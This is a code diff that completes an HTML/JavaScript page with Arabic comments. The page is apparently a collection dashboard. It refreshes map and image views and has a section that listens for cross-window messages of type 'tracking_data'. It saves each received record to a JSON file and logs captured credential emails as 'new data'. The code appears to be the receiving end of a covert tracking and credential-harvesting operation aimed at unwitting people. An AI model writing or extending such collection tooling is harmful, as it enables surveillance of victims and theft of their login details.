+        
+        // ========== التحديث التلقائي ==========
+        setInterval(() => {
+            if (collectedData) {
+                const now = new Date();
+                document.getElementById('last-update').textContent = now.toLocaleTimeString();
+            }
+        }, 60000); // كل دقيقة
+        
+        // ========== عند تحميل الصفحة ==========
+        window.onload = function() {
+            // إذا لم تكن الخريطة قد تم تحميلها بعد، انتظر
+            if (typeof google === 'undefined') {
+                setTimeout(loadData, 2000);
+            }
+            
+            // إغلاق المودال عند النقر خارج الصورة
+            document.getElementById('image-modal').addEventListener('click', (e) => {
+                if (e.target.id === 'image-modal') {
+                    closeModal();
+                }
+            });
+            
+            // تحديث تلقائي كل 10 ثوان (للاختبار)
+            setTimeout(refreshData, 10000);
+        };
+        
+        
+        
+        
+// صفحة استقبال البيانات
+const receivedData = [];
+
+window.addEventListener('message', function(event) {
+    if (event.data && event.data.type === 'tracking_data') {
+        receivedData.push(event.data);
+        saveToFile(event.data);
+        alertAdmin(event.data);
+    }
+});
+
+function saveToFile(data) {
+    const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'tracking_data_' + Date.now() + '.json';
+    a.click();
+}
+
+function alertAdmin(data) {
+    // إرسال إشعار فوري
+    if (data.credentials && data.credentials.email) {
+        console.log('⚠️ بيانات جديدة:', data.credentials.email);
+        // يمكنك إضافة إرسال إشعار هنا
+    }
+}
+        
+        
+    </script>
+</body>
+      </html>
